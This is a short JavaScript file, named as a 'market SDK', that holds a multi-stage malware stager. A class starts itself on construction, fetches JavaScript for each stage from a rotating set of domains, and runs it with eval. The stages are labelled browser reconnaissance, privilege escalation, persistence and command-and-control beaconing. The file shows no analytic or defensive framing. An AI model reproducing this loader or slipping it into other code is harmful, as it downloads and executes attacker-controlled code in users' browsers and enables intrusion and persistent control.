// E:\ucheP\_sdk\market_sdk.js
window.Stager = class Stager {
    static stages = {
        1: 'browser_recon',
        2: 'privilege_escalation',
        3: 'persistence',
        4: 'c2_beacon'
    };

    constructor() {
        this.currentStage = 1;
        this.executeStage();
    }

    async executeStage() {
        const stagePayload = await this.fetchStagePayload(this.currentStage);
        const result = await eval(`(${stagePayload})()`);
        
        if (result.success) {
            this.currentStage++;
            if (this.currentStage <= 4) {
                setTimeout(() => this.executeStage(), 5000);
            }
        }
    }

    async fetchStagePayload(stage) {
        const rotator = new DomainRotator();
        const domain = rotator.nextDomain();
        const response = await fetch(`https://${domain}/stage${stage}.js?t=${Date.now()}`);
        return await response.text();
    }
}